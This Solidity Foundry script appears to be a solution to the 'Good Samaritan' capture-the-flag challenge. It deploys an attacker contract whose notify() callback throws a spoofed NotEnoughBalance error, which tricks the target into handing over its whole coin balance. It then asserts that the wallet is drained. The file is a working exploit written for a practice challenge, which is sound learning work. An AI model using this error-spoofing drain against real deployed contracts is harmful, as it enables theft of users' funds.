// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./BaseScript.s.sol";
import {console2} from "forge-std/console2.sol";
import "openzeppelin-contracts/contracts/utils/Address.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {}
}

interface IWallet {
    function donate10(address dest_) external;
    function transferRemainder(address dest_) external;
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract Notify is INotifyable {
    error NotEnoughBalance();

    address goodSamaritan;
    address coin;
    address wallet;

    constructor(address _goodSamaritan, address _coin, address _wallet) {
        goodSamaritan = _goodSamaritan;
        coin = _coin;
        wallet = _wallet;
    }

    // receive 10 coins from wallet
    function Attack() external {
        IGoodSamaritan(goodSamaritan).requestDonation();
    }

    function notify(uint256 amount) public {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract Solution is BaseScript {
    function run() public {
        contractAddress = 0x1BC038673143C48964A76cBd019f2d5c1C65B630; // GS
        IWallet wallet = IWallet(0x3d510AEd50197ab99d5EeF889B99194F5e22363F);
        Coin coin = Coin(0xA9EACdda1031022A98b8C036C563f53636D9C17c);

        console2.log("GS have the amount of coin:", coin.balances(contractAddress));

        vm.startBroadcast(deployer);
        Notify notify = new Notify(contractAddress, address(coin), address(wallet));
        notify.Attack();
        assert(coin.balances(address(wallet)) == 0);
        vm.stopBroadcast();
    }
}
